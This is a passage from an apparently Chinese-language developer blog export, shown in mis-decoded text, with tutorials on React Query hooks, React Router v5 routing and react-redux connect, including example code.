ä¾†è™•ç†é€™ç¨® caseï¼Œä½†é‚„æ˜¯èƒ½èªè­˜ä¸€ä¸‹é€™å€‹ hookã€‚ é€™é‚Šå…ˆç›´æ¥çœ‹ codeï¼š 12345678910111213141516171819202122232425import axios from 'axios'import { useQueries } from 'react-query'const getHeroData = (id) =&gt; axios.get('http://localhost:4000/superheroes/' + id)// å‡è¨­ props æœƒæ¥æ”¶åˆ°ä¸€å€‹ç”± id çµ„æˆçš„é™£åˆ—export const RQDynamicParallel = ({ ids }) =&gt; { const queryResult = useQueries( ids.map((id) =&gt; { return { queryKey: ['heros', id], queryFn: () =&gt; getHeroData(id), // focus æ™‚ä¸ refetch refetchOnWindowFocus: false, // æ•´ç†è³‡æ–™æ ¼å¼ select: (response) =&gt; { if (response.data) { return response.data } } } }) ) return &lt;div&gt;DynamicParallel&lt;/div&gt;} useQueries åªæœƒæ¥æ”¶ä¸€å€‹åƒæ•¸ï¼Œé€™å€‹åƒæ•¸æœƒæ˜¯ä¸€å€‹ Arrayï¼Œè£¡é¢çš„æ¯ä¸€å€‹å…ƒç´ éƒ½æ˜¯ä¸€å€‹ç‰©ä»¶ã€‚é€™äº›ç‰©ä»¶å¯ä»¥æƒ³æˆæ˜¯ç”¨ä¾†ä»£è¡¨ useQuery çš„å…§å®¹ï¼Œæ‰€ä»¥ keyã€functionã€config ç­‰ç­‰çš„è¨­å®šéƒ½æœƒæ”¾åœ¨é€™è£¡é¢ã€‚ è‡³æ–¼å›å‚³çš„çµæœæœƒæ˜¯ä¸€å€‹ Array è£è‘—æ¯å€‹ useQuery çš„è³‡æ–™ï¼Œåƒé€™æ¨£ï¼š 123456789101112131415161718192021222324252627[ { \"status\": \"success\", \"isLoading\": false, \"isSuccess\": true, \"isError\": false, \"isIdle\": false, \"data\": { \"id\": 1, \"name\": \"Batman HoHoHo\", \"alterEgo\": \"Bruce Wayne\" }, \"dataUpdatedAt\": 1688996274677, \"error\": null, \"errorUpdatedAt\": 1688996252855, \"failureCount\": 0, \"isFetched\": true, \"isFetchedAfterMount\": true, \"isFetching\": false, \"isLoadingError\": false, \"isPlaceholderData\": false, \"isPreviousData\": false, \"isRefetchError\": false, \"isStale\": true } // ...ç•¥] å¸¸ç”¨åˆ°çš„ dataã€error ç­‰æœ‰ç”¨çš„è³‡è¨Šéƒ½æœƒå„²å­˜è£¡é¢ï¼Œæ‰€ä»¥å°±èƒ½é€éé€™å€‹ä¾†åšè™•ç†ã€‚ æœ‰ç›¸ä¾æ€§çš„è«‹æ±‚ç›¸ä¾æ€§çš„è«‹æ±‚æ˜¯æŒ‡å‡è¨­ä½ æœ‰ Aã€B å…©å€‹ API è¦æ‰“ï¼Œä½†å¯èƒ½ B éœ€è¦æ‹¿ A å›å‚³çš„è³‡æ–™ä¾†å‘¼å«ï¼Œæ‰€ä»¥ä½ å¿…é ˆç­‰ A æ‰“å®Œå¾Œæ‰æ¥è‘—å»æ‰“ Bï¼Œé€™å€‹å°±å«åšç›¸ä¾ï¼Œå› ç‚º B å¿…é ˆä¾è³´ Aã€‚ å¦‚æœæ˜¯å¯« useEffect çš„è©±æˆ‘å€‘é€šå¸¸æœƒç”¨ async / await ä¾†è™•ç†ï¼Œä¾‹å¦‚ï¼š 1234567useEffect(() =&gt; { async function callAPI() { const userData = await api.getUserData() // å–å¾— user è³‡æ–™ const channelData = await api.getChannel(userData.id) // æ‹¿ id æŠ“å‡ºé »é“ } callAPI()}, []) èªªå¯¦è©±æˆ‘è¦ºå¾—é€™ç¨® case åœ¨ useEffect çš„æƒ…å¢ƒä¸‹å¯«èµ·ä¾†é‚„è »ç›´è¦ºçš„ï¼Œå› ç‚ºå°±æ˜¯å–®ç´”çš„ JS æ¦‚å¿µè€Œå·²å˜›ï¼Œä¸éæ—¢ç„¶éƒ½ç”¨å¥—ä»¶äº†å°±å¾—ç…§å¥—ä»¶çš„è¦çŸ©ä¾†ï¼Œæ‰€ä»¥æ¥è‘—ä¾†çœ‹åœ¨ React Query è¦æ€éº¼åšä¸€æ¨£çš„äº‹å§ï¼ åœ¨ React Query çš„è©±ä½ å¿…é ˆé€™æ¨£åšï¼š 1234567891011121314151617import axios from 'axios'import { useQuery } from 'react-query'const getUserData = (email) =&gt; axios.get('http://localhost:4000/users/' + email)const getUserChannel = (channelId) =&gt; axios.get('http://localhost:4000/channels/' + channelId)export const RQDependent = ({ email }) =&gt; { // å–å¾— user è³‡æ–™ const { data: userData } = useQuery(['email', email], () =&gt; getUserData(email)) const channelId = userData?.data.channelId // æ‹¿ id æŠ“å‡ºé »é“ const { data: channelData } = useQuery(['channel', channelId], () =&gt; getUserChannel(channelId), { enabled: Boolean(channelId) // &lt;- é—œéµé» }) return &lt;div&gt;RQDependent&lt;/div&gt;} å…¶å¯¦æ¦‚å¿µä¸Šå·®ä¸å¤šï¼Œåªæ˜¯å› ç‚ºç¾åœ¨æ˜¯ hook æ‰€ä»¥æ²’è¾¦æ³•å¯«ä»€éº¼ async / awaitï¼Œå› æ­¤å¾—æ”¹ç”¨ enabled é€™å€‹ flag ä¾†è™•ç†ï¼Œæµç¨‹å¤§æ¦‚æœƒåƒä¸‹é¢é€™æ¨£ï¼š å‰›é€²å…¥é é¢æ™‚ï¼Œæœƒå…ˆæ‰“ user çš„ APIï¼ˆå› ç‚ºå®ƒçš„ enabled é è¨­æ˜¯ trueï¼‰ æ‹¿åˆ° user è³‡æ–™å¾Œï¼ŒBoolean(channelId) æœƒå¾ false è½‰æˆ true å‘¼å«å–å¾—é »é“è³‡è¨Šçš„ APIï¼ŒçµæŸã€‚ æ‰€ä»¥å°±æ˜¯ä¸€å€‹ç”¨ enabled ä¾†æ§åˆ¶ä»€éº¼æ™‚å€™è¦ç™¼å‡ºè«‹æ±‚çš„æ¦‚å¿µï¼Œæˆ‘è¦ºå¾—ç›¸è¼ƒèµ·ä¾†æ¯”è¼ƒæ²’é‚£éº¼ç›´è¦ºï¼Œä½†ä¹Ÿä¸å¤±ç‚ºä¸€ç¨®åšæ³•å°±æ˜¯äº†ï¼ ä¸æƒ³è¦ä¸€ç›´çœ‹åˆ° Loadingï¼Ÿä¹Ÿè¨±å¯ä»¥è©¦è©¦ initialDataé€™å€‹æƒ…å¢ƒæ˜¯é€™æ¨£å­ï¼Œæˆ‘å€‘å…ˆä¾†çœ‹åœ–èªªæ•…äº‹ï¼š é€™æ˜¯ä¸€å€‹å¾ List é€²å…¥ Detail é é¢çš„ç¤ºç¯„ã€‚åœ¨æˆ‘å€‘é‚„æ²’æœ‰ Cache ä¹‹å‰é€²å…¥ä¸€å€‹ Detail é é¢éƒ½å¿…é ˆå…ˆ Loadingï¼Œæ¥è‘—ç­‰æ‹¿åˆ°è³‡æ–™å¾Œå†é¡¯ç¤ºç•«é¢ã€‚ é€™æ™‚å€™å°±æœ‰ä¸€å€‹æƒ³æ³•å†’å‡ºä¾†äº†ï¼š å¦‚æœ List çš„è³‡æ–™æœ¬èº«å°±åŒ…å«ä¸€äº› Detail è³‡è¨Šçš„è©±ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥æ‹¿ä¾†ç•¶ä½œ Detail é é¢çš„åˆå§‹è³‡æ–™ï¼Œæ¥è‘—å†é€éèƒŒæ™¯ refetch çš„æ–¹å¼å»æ›´æ–°å®Œæ•´å…§å®¹å°±å¥½ï¼Ÿé€™æ¨£å°±ä¸éœ€è¦æ¯ä¸€æ¬¡éƒ½çœ‹åˆ° Loading äº†ã€‚ ç­”æ¡ˆç•¶ç„¶æ˜¯å¯ä»¥ã€‚åªæ˜¯é›–ç„¶ä¸ç”¨ç­‰ Loading æ˜¯ä»¶å¥½äº‹ï¼Œä½†æˆ‘è¦ºå¾—ç”¨èƒŒæ™¯åˆ·æ–°çš„é€™ç¨®æ–¹å¼åœ¨æœ‰äº›æƒ…å¢ƒä¸‹å¯èƒ½åè€Œæ˜¯ç¨®åæ•ˆæœï¼Œæ‰€ä»¥ç”¨ä¹‹å‰é‚„æ˜¯è¦æƒ³ä¸€ä¸‹æ˜¯ä¸æ˜¯çœŸçš„é©åˆåœ¨ç”¨æœƒæ¯”è¼ƒå¥½ã€‚ è¦å¯¦ç¾é€™ä»¶äº‹å¾ˆç°¡å–®ï¼Œæ€è·¯æ˜¯é€™æ¨£ï¼š åœ¨ Detail é é¢çš„ useQuery åŠ ä¸Š initialData çš„ config åˆ©ç”¨ useQueryClient æ‹¿åˆ° List é é¢çš„å¿«å–è³‡æ–™ï¼Œå¯«å…¥ initialData å¯¦éš›çš„ code æœƒé•·é€™æ¨£ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142import axios from 'axios'import React from 'react'import { useQuery, useQueryClient } from 'react-query'import { useParams } from 'react-router-dom/cjs/react-router-dom.min'const getHeroDetail = (id) =&gt; axios.get('http://localhost:4000/superheroes/' + id)export const RQSuperHeroDetail = () =&gt; { const { id } = useParams() // æ‹¿åˆ° reaact query instance const queryClient = useQueryClient() const { data, isLoading } = useQuery(['super-hero-detail', id], () =&gt; getHeroDetail(id), { // åŠ ä¸Š config initialData: () =&gt; { const queryKeyOfListing = 'super-hero' // é€é key å»æ‰¾å‡ºå°æ‡‰çš„å¿«å–ï¼Œå†å¾å¿«å–ä¸­æ‰¾å‡ºå°æ‡‰çš„è³‡æ–™ const hero = queryClient.getQueryData(queryKeyOfListing)?.data?.find((hero) =&gt; hero.id === Number(id)) if (hero) { return { data: hero } } return undefined } }) if (isLoading) { return &lt;h2&gt;Loading...&lt;/h2&gt; } if (data.data) { return ( &lt;div&gt; &lt;h2&gt;Id: {data.data.id}&lt;/h2&gt; &lt;h2&gt;Name: {data.data.name}&lt;/h2&gt; &lt;h2&gt;Alter Ego: {data.data.alterEgo}&lt;/h2&gt; &lt;/div&gt; ) } return null} æ”¹å¯«æˆé€™æ¨£å¾Œï¼Œç¬¬ä¸€æ¬¡é€²å…¥ Detail é é¢æ™‚å°±æœƒå…ˆæ‹¿ initialData ä¾†é¡¯ç¤ºï¼Œæ¥è‘—å†é€éèƒŒæ™¯ refetch ä¾†æ›´æ–°è³‡æ–™ï¼Œæ•ˆæœæœƒåƒé€™æ¨£ï¼š é€™æ¨£å­å°±ä¸æœƒå†æœ‰ Loading ç•«é¢äº†ï¼Œç„¶å¾Œç­‰æ‹¿åˆ°è³‡æ–™çš„æ™‚å€™å†æ›´æ–°åˆ°ç•«é¢ä¸Šã€‚ ä¸éå°±åƒä¸€é–‹å§‹èªªçš„ï¼Œæœ‰äº›æ™‚å€™åŠ ä¸Šå¿…è¦çš„ Loading å…¶å¯¦æ˜¯æ¯”è¼ƒå¥½çš„ï¼Œæ‰€ä»¥æˆ‘è¦ºå¾—é‚„æ˜¯è¦çœ‹æ™‚æ©Ÿä¾†ä½¿ç”¨ã€‚","link":"/2023/07/11/react-query/"},{"title":"Reactï¼react router dom(V5)","text":"å›ä¾†é‡æº«ä¸€ä¸‹ã€‚ ç°¡è¿°é›–ç„¶ä¹‹å‰æœ‰å­¸é v6 çš„ç‰ˆæœ¬ï¼Œä¸éé‚„æ˜¯æƒ³ä¾†æŠŠ v5 çµ¦å¼„æ¸…æ¥šä¸€äº›ï¼Œä»¥å…ä¹‹å¾Œç¢°åˆ°èˆŠå°ˆæ¡ˆæ™‚æœƒè¸©åˆ°é›·ã€‚ åŸºæœ¬çµæ§‹åœ¨ v6 è£¡æœƒç”¨ BrowserRouterã€Routes å’Œ Route ä¾†çµ„æˆï¼Œv5 å…¶å¯¦ä¹Ÿå·®ä¸å¤šï¼Œåªæ˜¯å¤šäº† exact è·Ÿ Switch é€™å…©å€‹æ±è¥¿ã€‚ å…ˆä¾†çœ‹ codeï¼š 123456789101112131415161718192021222324import { BrowserRouter, Route, Switch } from \"react-router-dom\"import About from \"./pages/About\";import Contact from \"./pages/Contact\";import Home from \"./pages/Home\";export default function App() { return ( &lt;div className=\"container\"&gt; &lt;BrowserRouter&gt; &lt;Switch&gt; &lt;Route exact path=\"/\"&gt; &lt;Home /&gt; &lt;/Route&gt; &lt;Route path=\"/about\"&gt; &lt;About /&gt; &lt;/Route&gt; &lt;Route path=\"/contact\"&gt; &lt;Contact /&gt; &lt;/Route&gt; &lt;/Switch&gt; &lt;/BrowserRouter&gt; &lt;/div&gt; );} ç°¡å–®èªªæ˜ä¸€ä¸‹ï¼š å…ƒä»¶è¦ç•¶ä½œ Route çš„ childrenï¼Œä¸æ˜¯é€é props Switch çš„ä½œç”¨æ˜¯ã€Œåªé¡¯ç¤ºç¬¬ä¸€å€‹åŒ¹é…çš„ pathã€ï¼Œå¦å‰‡æœƒå…¨éƒ¨é¡¯ç¤ºå‡ºä¾† exact çš„ä½œç”¨æ˜¯ã€Œå¿…é ˆä¸€æ¨¡ä¸€æ¨£æ‰ç®—ã€ é€™é‚Šè§£é‡‹ä¸€ä¸‹ exact çš„éƒ¨åˆ†ï¼Œå‡è¨­æ²’æœ‰åŠ çš„è©±ï¼Œæˆ‘åˆ° /about æˆ– /contact éƒ½æœƒåŒ¹é…åˆ° / çš„å…ƒä»¶ï¼Œç‚ºä»€éº¼ï¼Ÿ ä½ åªè¦ç”¨ regex çš„ã€Œéƒ¨åˆ†åŒ¹é…ã€æ¦‚å¿µä¾†æ€è€ƒå°±è¡Œäº†ï¼Œ/about æ˜¯ä¸æ˜¯ä¹ŸåŒ…å« / é€™å€‹è·¯å¾‘ï¼Ÿ/contact æ˜¯ä¸æ˜¯ä¹Ÿä¸€æ¨£ï¼Ÿé€™å€‹å°±æ˜¯ä»–çš„è¦å‰‡ã€‚ Nav èˆ‡ NavLinkè¦åˆ‡æ›ä¸åŒé é¢çš„è©±ä¸€æ¨£æœƒé€é Link ä¾†åšï¼Œåƒé€™æ¨£ï¼š 123456789101112131415161718192021222324252627282930import { BrowserRouter, Route, Switch, Link } from \"react-router-dom\"import About from \"./pages/About\";import Contact from \"./pages/Contact\";import Home from \"./pages/Home\";export default function App() { return ( &lt;div className=\"container\"&gt; &lt;BrowserRouter&gt; &lt;nav&gt; &lt;h1&gt;My articles&lt;/h1&gt; &lt;Link to=\"/\"&gt;Home&lt;/Link&gt; &lt;Link to=\"/about\"&gt;About&lt;/Link&gt; &lt;Link to=\"/contact\"&gt;Contact&lt;/Link&gt; &lt;/nav&gt; &lt;Switch&gt; &lt;Route exact path=\"/\"&gt; &lt;Home /&gt; &lt;/Route&gt; &lt;Route path=\"/about\"&gt; &lt;About /&gt; &lt;/Route&gt; &lt;Route path=\"/contact\"&gt; &lt;Contact /&gt; &lt;/Route&gt; &lt;/Switch&gt; &lt;/BrowserRouter&gt; &lt;/div&gt; );} é€™å€‹è·Ÿ v6 æ²’ä»€éº¼å·®ï¼Œæ¯”è¼ƒç‰¹åˆ¥çš„æ˜¯ NavLinkï¼š 123456789101112131415161718192021222324252627282930import { BrowserRouter, Route, Switch, NavLink } from \"react-router-dom\"import About from \"./pages/About\";import Contact from \"./pages/Contact\";import Home from \"./pages/Home\";export default function App() { return ( &lt;div className=\"container\"&gt; &lt;BrowserRouter&gt; &lt;nav&gt; &lt;h1&gt;My articles&lt;/h1&gt; &lt;NavLink exact to=\"/\"&gt;Home&lt;/NavLink&gt; &lt;NavLink to=\"/about\"&gt;About&lt;/NavLink&gt; &lt;NavLink to=\"/contact\"&gt;Contact&lt;/NavLink&gt; &lt;/nav&gt; &lt;Switch&gt; &lt;Route exact path=\"/\"&gt; &lt;Home /&gt; &lt;/Route&gt; &lt;Route path=\"/about\"&gt; &lt;About /&gt; &lt;/Route&gt; &lt;Route path=\"/contact\"&gt; &lt;Contact /&gt; &lt;/Route&gt; &lt;/Switch&gt; &lt;/BrowserRouter&gt; &lt;/div&gt; );} é€™å€‹çš„ç”¨æ„æ˜¯ï¼Œç•¶æˆ‘åœ¨ / æ™‚å®ƒæœƒè‡ªå‹•å¹«æˆ‘åœ¨å°æ‡‰çš„ NavLink åŠ ä¸Š .active çš„ classï¼Œæ‰€ä»¥ä½ å¯ä»¥åˆ©ç”¨é€™å€‹ä¾†è™•ç†ã€Œç›®å‰æ‰€åœ¨ä½ç½®ã€çš„æ¨£å¼ï¼Œå°±ä¸ç”¨å†è‡ªå·±å¯« expressin ä¾†åˆ¤æ–·äº†ã€‚ è‡³æ–¼ exact çš„ç”¨é€”å°±è·Ÿå‰é¢èªªçš„ä¸€æ¨£ï¼Œæ˜¯ç”¨ä¾†é¿å…ã€Œéƒ¨åˆ†åŒ¹é…ã€çš„å•é¡Œï¼ˆåœ¨ /about é é¢ / ä¹Ÿæœƒè¢«åŠ ä¸Š .activeï¼‰ã€‚ useHistoryæœ‰äº›æ™‚å€™å¯èƒ½éœ€è¦æ‰‹å‹•åˆ‡æ›åˆ°æŸè·¯ç”±ï¼Œåœ¨ v6 çš„æ™‚å€™æœƒç”¨ useNavigateï¼Œv5 åªæ˜¯æ›æˆ useHistory è€Œå·²ï¼š 1234567export default function Article() { const history = useHistory() useEffect(() =&gt; { if (!error) return setTimeout(() =&gt; history.push('/'), 2000) }, [error, history])} é—œæ–¼ 404 é é¢ç•¶ä½¿ç”¨è€…åˆ°äº†ã€Œä¸å­˜åœ¨çš„è·¯ç”±ã€æ™‚ï¼Œå¯èƒ½æœƒå¸Œæœ›ä¸€å¾‹å°å‘è‡³ç‰¹å®šçš„é é¢ï¼ˆä¾‹å¦‚ 404ï¼‰ï¼Œé€™æ™‚å€™å°±å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹å¼ä¾†åšï¼š 1234567891011121314151617181920// ä½¿ç”¨ Redirect å…ƒä»¶import { Redirect } from \"react-router-dom\"&lt;Switch&gt; &lt;Route exact path=\"/\"&gt; &lt;Home /&gt; &lt;/Route&gt; &lt;Route path=\"/about\"&gt; &lt;About /&gt; &lt;/Route&gt; &lt;Route path=\"/contact\"&gt; &lt;Contact /&gt; &lt;/Route&gt; &lt;Route path=\"/article/:id\"&gt; &lt;Article /&gt; &lt;/Route&gt; // æ”¾åœ¨æœ€å¾Œä¸€å€‹ &lt;Route path=\"*\"&gt; &lt;Redirect to=\"/\" /&gt; &lt;/Route&gt;&lt;/Switch&gt; ç•¶ React åŒ¹é…ä¸åˆ°å‰é¢çš„ä»»ä½•ä¸€å€‹æ™‚ï¼Œå°±æœƒå¥—ç”¨ * çš„è·¯å¾‘ï¼Œæ¥è‘—å†é€é Redirect å°å‘åˆ°æˆ‘å€‘æƒ³è¦çš„åœ°æ–¹ï¼ˆå¯ä»¥æ˜¯ 404 é é¢ï¼‰ã€‚ å¦å¤–ä½ å¯èƒ½æœƒæƒ³èªªï¼Œé‚£å¦‚æœé€™æ¨£å¯«å‘¢ï¼Ÿ 123456789101112131415161718&lt;Switch&gt; &lt;Route exact path=\"/\"&gt; &lt;Home /&gt; &lt;/Route&gt; &lt;Route path=\"/about\"&gt; &lt;About /&gt; &lt;/Route&gt; &lt;Route path=\"/contact\"&gt; &lt;Contact /&gt; &lt;/Route&gt; &lt;Route path=\"/article/:id\"&gt; &lt;Article /&gt; &lt;/Route&gt; &lt;Route path=\"*\"&gt; // ç›´æ¥é¡¯ç¤º Home å…ƒä»¶ &lt;Home /&gt; &lt;/Route&gt;&lt;/Switch&gt; å¦‚æœå–®çœ‹ç•«é¢çš„è©±é€™æ¨£å¯«æ²’å•é¡Œï¼Œå¯æ˜¯æœ‰ä¸€å€‹è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ã€Œç¶²å€ä¸æœƒè®Šã€ï¼Œä»€éº¼æ„æ€ï¼Ÿ æ„æ€æ˜¯å‡è¨­æˆ‘åˆ° /asoqekjwiq æ™‚ï¼Œé›–ç„¶æœƒå¦‚æœŸé¡¯ç¤º Home çš„å…§å®¹ï¼Œä½†ç¶²å€ä¾èˆŠæœƒåœç•™åœ¨ /asoqekjwiq é€™å€‹çœ‹èµ·ä¾†å¾ˆæ€ªçš„è·¯å¾‘ã€‚å¯æ˜¯å¦‚æœæ˜¯é€é Redirect çš„è©±ï¼Œç¶²å€å°±æœƒå› ç‚ºè·³è½‰çš„é—œä¿‚è¢«æ›´æ–°ç‚º /ã€‚ å› æ­¤å¾é€™å€‹çµæœä¾†çœ‹æˆ‘æœƒè¦ºå¾— Redirect æ˜¯æ¯”è¼ƒåˆç†çš„é¸æ“‡ã€‚ queryStringç•¶æˆ‘å€‘æƒ³å–å¾—ç¶²å€ä¸Šçš„ ?name=peanu&amp;age=24 é€™ç¨® queryString æ™‚ï¼Œä¸æ˜¯é€é path ä¾†å»ºç«‹å°æ‡‰è·¯ç”±ï¼Œè€Œæ˜¯é€é useLocation è·Ÿ URLSearchParams ä¾†å¯¦ä½œã€‚ ç›´æ¥ä¾†çœ‹ä¾‹å­ï¼š 123456789101112131415161718import React from 'react'import { useLocation } from \"react-router-dom\"export default function Contact() { // ç”¨ search æ–¹æ³•ä¾†å–å¾— const queryString = useLocation().search // new ä¸€å€‹ç”¨ä¾†æ ¼å¼åŒ–çš„ instance const queryParams = new URLSearchParams(queryString) // é€é getter å–å‡ºæŸå€‹ key çš„å€¼ const name = queryParams.get('name') return ( &lt;div&gt; &lt;h2&gt;Hey {name}, Contact us...&lt;/h2&gt; &lt;p&gt;Lorem ipsum, dolor sit amet consectetur adipisicing elit. Eius harum rerum repellat incidunt officiis molestias vitae tempora deserunt deleniti labore optio nobis ipsam odio aliquam, soluta dolorum praesentium aut? Fugit.&lt;/p&gt; &lt;/div&gt; )} é™„è¨»ï¼šuseLocation æ˜¯ react-router-dom æä¾›çš„ hookï¼ŒURLSearchParams æ˜¯å…ƒç”Ÿ JS çš„æ±è¥¿ï¼Œåˆ¥ææ··äº†ã€‚ å…¶å¯¦å°±é€™æ¨£å­ï¼Œæ²’ä»€éº¼è¤‡é›œçš„ï¼Œä½†æœƒç”¨åˆ°å®ƒçš„æ™‚æ©Ÿä¹Ÿè¨±é‚„è »å¤šçš„ã€‚ è·¯ç”±å®ˆè¡›å…¶å¯¦å°±æ˜¯ä¸€ç¨®é‹ç”¨ Redirect çš„å°æŠ€å·§ï¼Œå› ç‚ºé€™å€‹æ–¹å¼åªé©ç”¨æ–¼ V5ï¼Œæ‰€ä»¥ç°¡å–®è£œå……ä¸€ä¸‹ã€‚ ä¸€èˆ¬ç¶²é éƒ½æœƒæœ‰ã€Œæ¬Šé™ç®¡ç†æ©Ÿåˆ¶ã€ï¼Œå°±æ˜¯èªªå‡è¨­æˆ‘æ²’ç™»å…¥çš„è©±å°±ä¸èƒ½é€ è¨ªæŸæŸé çš„é€™ç¨®è¦å‰‡ã€‚é‚£é€™å€‹æ™‚å€™è©²æ€éº¼å¯«æ¯”è¼ƒå¥½ï¼Ÿåƒè€ƒä¸‹é¢çš„ä¾‹å­ï¼š 1234567891011121314151617181920212223// å„²å­˜åœ¨ Context çš„ user è³‡è¨Šï¼ˆæ²’ç™»å…¥æ™‚æœƒæ˜¯ nullï¼‰const { user } = useAuthContext()&lt;BrowserRouter&gt; &lt;Nav /&gt; &lt;Switch&gt; &lt;Route exact path=\"/\"&gt; {user ? &lt;DashBoard /&gt; : &lt;Redirect to=\"/login\" /&gt;} &lt;/Route&gt; &lt;Route path=\"/login\"&gt; {!user ? &lt;Login /&gt; : &lt;Redirect to=\"/\" /&gt;} &lt;/Route&gt; &lt;Route path=\"/signup\"&gt; {!user ? &lt;Signup /&gt; : &lt;Redirect to=\"/\" /&gt;} &lt;/Route&gt; &lt;Route path=\"/create\"&gt; {user ? &lt;Create /&gt; : &lt;Redirect to=\"/login\" /&gt;} &lt;/Route&gt; &lt;Route path=\"/project/:id\"&gt; {user ? &lt;Project /&gt; : &lt;Redirect to=\"/login\" /&gt;} &lt;/Route&gt; &lt;/Switch&gt;&lt;/BrowserRouter&gt; æˆ‘åªè¦é‹ç”¨é‹ç®—ä¾†æ±ºå®šè¦çœŸæ­£è¦é¡¯ç¤ºçš„ Routeï¼Œå°±å¯ä»¥åšåˆ°æ¬Šé™ç®¡ç†çš„é™åˆ¶ã€‚åƒæ˜¯ user å¦‚æœä¸å­˜åœ¨çš„è©±å°±ä¸èƒ½é€ è¨ª &lt;DashBoard&gt;ï¼Œè€Œæ˜¯æœƒè¢«é‡æ–°å°å‘åˆ° /login å»ã€‚","link":"/2022/06/30/react-react-router-dom-v5/"},{"title":"ç”¨ react-redux æŠŠ redux è·Ÿ React ä¸²æ¥èµ·ä¾†ï¼ˆConnect ç‰ˆæœ¬ï¼‰","text":"æ—©æœŸçš„æ–¹æ³•ï¼Œé›–ç„¶éº»ç…©ä½†ä¹Ÿæœ‰ä¸€äº›å¥½è™•ã€‚ ç°¡è¿°ç”¨ react redux ä¸²æ¥ redux çš„æ–¹æ³•æœ‰å…©ç¨®ï¼š hook connect ç›®å‰éƒ½æœƒæ¨è–¦ç”¨ hook çš„æ–¹å¼ä¾†ä¸²ï¼Œä½†å»ºè­°é‚„æ˜¯èƒ½äº†è§£ä¸€ä¸‹ connect çš„åšæ³•æ˜¯æ€éº¼åšçš„ã€‚ æ­£æ–‡å®ƒèƒŒå¾Œçš„åŸç†å…¶å¯¦å°±æ˜¯ã€ŒæŠŠ store çš„æ±è¥¿ç•¶ä½œ props å‚³åˆ° component è£¡é¢ã€ï¼Œæˆ‘æ¡†èµ·ä¾†çš„åœ°æ–¹æ˜¯é‡é»ï¼Œä¸€å®šè¦çœ‹æ‡‚ã€‚ é€™ç¨®ä½œæ³•ç¨±ç‚ºï¼š HOC Higher Order Componentï¼Œæ„æ€å°±æ˜¯ Component åœ¨åŒ…ä¸€å±¤ Component ç¸½è€Œè¨€ä¹‹å¯«èµ·ä¾†æœƒé•·é€™æ¨£ï¼ˆå…ˆçœ‹å€‹å¤§æ¦‚å°±å¥½ï¼Œçœ‹ä¸æ‡‚æ²’é—œä¿‚ï¼‰ï¼š 1234567891011121314151617181920212223import TodoInput from \"../components/TodoInput\";import { connect } from \"react-redux\";import { addTodo } from \"../redux/actions\";// é€™å…©å€‹ function ä¸‹é¢æœƒåœ¨è§£é‡‹const mapStateToProps = store =&gt; { return { todos: store.todosReducer.todos }};const mapDispatchToProps = dispatch =&gt; { return { addTodo: payload =&gt; dispatch(addTodo(payload)) }}// åœ¨ connect å‚³å…¥å…©å€‹ functionï¼Œæ‹¿åˆ° store è£¡é¢çš„æ±è¥¿const connectToStore = connect(mapStateToProps, mapDispatchToProps);// æŠŠ TodoInput é€™å€‹ Component å‚³çµ¦ connectToStore// å®ƒæœƒç”¢ç”Ÿä¸€å€‹æ–°çš„ Componentconst connectTodoInput = connectToStore(TodoInput)// æœ€å¾ŒæŠŠæ–°çš„ Component è¼¸å‡ºexport default connectTodoInput; åœ¨è§£é‡‹é€™æ®µ code ä»¥å‰å…ˆæ‰“å€‹å²”ã€‚ é‚„è¨˜å¾—å‰›å‰›èªªçš„å—ï¼Ÿ connect çš„åŸç†åªæ˜¯å¤šåŒ…ä¸€å±¤ Component è€Œå·²ï¼Œæ‰€ä»¥é—œæ–¼ Component å…¶å¯¦é‚„å¯ä»¥åˆ†æˆä¸‹é¢é€™å…©å€‹æ±è¥¿ï¼š dump / presentational Component smart / container Component é‚£å€‹è² è²¬æ¥æ”¶ props çš„ Component å°±å«åš dump componentï¼Œå› ç‚ºå®ƒå®Œå…¨ä¸çŸ¥é“ redux çš„å­˜åœ¨ï¼Œå®ƒåªçŸ¥é“ã€Œå“¦ï¼Œæˆ‘æœƒæ¥æ”¶åˆ° propsï¼Œæˆ‘ç”¨å°±å°äº†ã€ã€‚ è€Œé‚£å€‹è² è²¬æŠŠ store å‚³ä¸‹å»çš„ Component å°±æ˜¯ smart componentï¼Œå› ç‚ºå®ƒçŸ¥é“ redux çš„å­˜åœ¨ï¼Œä¸åƒ dump component ç´”ç²¹åªç®¡ç† UI çš„é¡¯ç¤ºã€‚ æ‰€ä»¥é€™æ™‚å€™å‘¢ï¼Œè³‡æ–™å¤¾çš„çµæ§‹é€šå¸¸æœƒé•·æˆé€™æ¨£å­ï¼š containers todoInput.jsï¼ˆdump Componentï¼‰ components todoInput.jsï¼ˆsmart Componentï¼‰ é›–ç„¶åªçœ‹åå­—çš„è©±æ„Ÿè¦ºæ˜¯ä¸€æ¨£çš„æ±è¥¿ï¼Œä½†å®ƒèƒŒå¾Œå»æœ‰è‘— dump è·Ÿ smart çš„å€åˆ¥ã€‚ é€™å€‹æƒ³æ³•æ˜¯ Redux çš„ä½œè€… Dan Abramov æå‡ºçš„ï¼Œæœ‰èˆˆè¶£çš„è©±æ¨è–¦å»çœ‹é€™ç¯‡æ–‡ç« ï¼šPresentational and Container Components å¥½ï¼Œè®“æˆ‘å€‘å›ä¾†è§£é‡‹ code çš„éƒ¨åˆ†å§ã€‚ é¦–å…ˆ connect åªæ˜¯å€‹ç”¨ä¾†è·Ÿ store ä¸²æ¥èµ·ä¾†çš„å‡½å¼ï¼Œå®ƒæœƒæ¥æ”¶å…©å€‹åƒæ•¸ï¼ˆfunctionï¼‰ï¼š 1. mapStateToProps 12345const mapStateToProps = store =&gt; { return { todos: store.todosReducer.todos }}; è·Ÿ useSelector æ˜¯å·®ä¸å¤šçš„æ¦‚å¿µï¼Œå°±æ˜¯ã€Œå¾ store æŠŠæƒ³è¦çš„ state é¸å‡ºä¾†ã€ï¼Œç„¶å¾Œ returnï¼Œå®ƒå°±æœƒè¢«ç•¶æˆ Props å‚³å…¥ï¼ˆå®ƒçš„å‡½å¼å‘½åæˆ‘è¦ºå¾—æœ‰å¤ è²¼åˆ‡ï¼‰ã€‚ 2. mapDispatchToProps 12345const mapDispatchToProps = dispatch =&gt; { return { addTodo: payload =&gt; dispatch(addTodo(payload)) }} æˆ‘æ˜¯é€™æ¨£ç†è§£å•¦ï¼Œä½ å¯ä»¥å…ˆæ€è€ƒé€™å€‹å•é¡Œï¼Œã€Œç¾åœ¨æ²’æœ‰ 